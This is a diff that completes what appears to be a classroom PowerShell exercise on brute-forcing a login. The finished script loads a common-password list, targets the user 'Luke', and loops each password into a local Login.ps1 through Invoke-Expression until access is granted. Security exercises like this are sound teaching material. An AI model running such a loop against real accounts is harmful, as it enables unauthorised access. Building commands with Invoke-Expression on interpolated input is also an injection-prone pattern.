@@ -39,12 +39,12 @@ cd $Path                                                         #              
 # Create a variable that stores the content from the most commonly used password file. 
 # *Important* Use the file path .\10k-most-common-passwords.txt
 # YOUR CODE BELOW HERE 
-
+$commonPasswords = Get-Content .\10k-most-common-passwords.txt
 
 # 2. A variable is needed that stores the victim's username. 
 # HINT: Look for the victim's username in the description above.
 # YOUR CODE BELOW HERE
-
+$username = "Luke"
 
 # 3. Now you are ready to write your function. 
 # Declare your function named "crackLogin" and will need 2 parameters.
@@ -53,12 +53,13 @@ cd $Path                                                         #              
 # entire script to test your function out. I would try to complete #4-#7 and then test your function.
 # YOUR CODE BELOW HERE (*Note the lefthand curly brace already provided for your function)
 
-{
+function crackLogin(){
+    param ([String]$user, [String[]]$passwordList)
     # 4. Below you will attempt each password in the pasword list for your brute force attack! 
     # Write a foreach loop method to itereate through each common password in the password file. 
     # (Hint: Check out the argument names you provided to the function, agian the first lefthand curly brace provided)
     # YOUR CODE BELOW HERE 
-
+    foreach($pass in $passwordList)
     {
         # 5. You will need to build an array of user credentials to attempt the hack with.
         # * Create an empty array called "payload". 
@@ -67,7 +68,7 @@ cd $Path                                                         #              
         # * Add a SINGLE password to the payload array.
         # Feel free to print out the payload array after its created
         # YOUR CODE BELOW HERE
- 
+        $payload = @($user, $pass)
         
         ## DO NOT MODIFY ##
         Write-Host "--------------"
@@ -79,7 +80,7 @@ cd $Path                                                         #              
         # Your job is complete the line and payload array created earlier.
         # Remember <payload array variable> will need to be replaced with the variable name of the payload array.
         # YOU MUST MODIFY LINE BELOW
-        Invoke-Expression  "& `".\Login.ps1`" <payload array variable>" -OutVariable out
+        Invoke-Expression  "& `".\Login.ps1`" $payload" -OutVariable out
  
         # 7. The payload has been sent to the login screen, and the result has been sent 
         # back to you as the variable $out.
@@ -88,6 +89,9 @@ cd $Path                                                         #              
         # * When access is granted, write a statement to RETURN the successful payload array
         #   and stop the loop from attempting anymore payloads.
         # YOUR CODE BELOW HERE
+        if($out -eq "Access Granted"){
+            RETURN $payload
+        }
 
 
     ## DO NOT MODIFY BELOW    
@@ -103,4 +107,5 @@ cd $Path                                                         #              
 # You created two variables in #1 and #2 that could be called here.
 # One final hint, a password match should happen in the first 15 seconds but no longer than a minute :)
 # YOUR CODE BELOW HERE 
-
+$result = crackLogin $username $commonPasswords
+Write-Host $result[-2] $result[-1]
